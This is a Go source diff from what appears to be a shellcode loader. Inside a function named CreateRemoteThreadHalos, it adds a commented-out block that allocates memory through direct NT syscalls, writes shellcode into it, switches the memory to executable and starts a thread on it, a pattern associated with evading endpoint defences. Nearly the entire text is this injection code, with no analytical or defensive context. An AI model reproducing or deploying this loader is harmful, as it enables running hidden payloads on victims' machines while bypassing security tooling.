@@ -166,5 +166,68 @@ func CreateRemoteThreadHalos(shellcode []byte) error {
 		return err
 	}
 
+	/*var addr uintptr
+		regionsize := uintptr(len(shellcode))
+
+		r1, err := Syscall(
+			NtAllocateVirtualMemory,
+			uintptr(0xffffffffffffffff),
+			uintptr(unsafe.Pointer(&addr)),
+			0,
+			uintptr(unsafe.Pointer(&regionsize)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			syscall.PAGE_READWRITE,
+		)
+		if r1 != 0 {
+	    fmt.Println("x")
+			return err
+		}
+
+		Syscall(
+			NtWriteVirtualMemory,
+			uintptr(0xffffffffffffffff),
+			addr,
+			uintptr(unsafe.Pointer(&shellcode[0])),
+			uintptr(len(shellcode)),
+			0,
+		)
+
+		var oldProtect uintptr
+		r2, err := Syscall(
+			NtProtectVirtualMemory,
+			uintptr(0xffffffffffffffff),
+			uintptr(unsafe.Pointer(&addr)),
+			uintptr(unsafe.Pointer(&regionsize)),
+			syscall.PAGE_EXECUTE_READ,
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if r2 != 0 {
+	    fmt.Println("xx")
+			return err
+		}
+
+		var hhosthread uintptr
+		r3, err := Syscall(
+			NtCreateThreadEx,
+			uintptr(unsafe.Pointer(&hhosthread)),
+			0x1FFFFF,
+			0,
+			uintptr(0xffffffffffffffff),
+			addr,
+			0,
+			uintptr(0),
+			0,
+			0,
+			0,
+			0,
+		)
+
+		syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+
+		if r3 != 0 {
+	    fmt.Println("xxx")
+			return err
+		}*/
+
 	return nil
 }
